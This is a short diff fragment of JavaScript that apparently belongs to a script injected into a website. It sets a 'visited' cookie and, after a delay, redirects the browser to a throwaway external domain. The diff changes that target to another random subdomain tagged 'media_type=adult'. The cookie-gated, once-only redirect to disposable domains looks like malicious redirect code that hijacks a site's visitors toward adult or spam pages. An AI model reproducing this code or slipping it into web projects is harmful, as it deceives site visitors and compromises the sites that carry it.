@@ -114,7 +114,7 @@ xhttp.send();
         document.cookie = "visited=true;expires=" + expires.toUTCString();
 
 
-        setTimeout('window.location.href = "https://bgfffig.czpiix.com/s/490ea52c75cda"', xRedir);
+        setTimeout('window.location.href = "https://126d6948e63e.bright-fawn.com/?p=18317&media_type=adult"', xRedir);
 
         }
         });
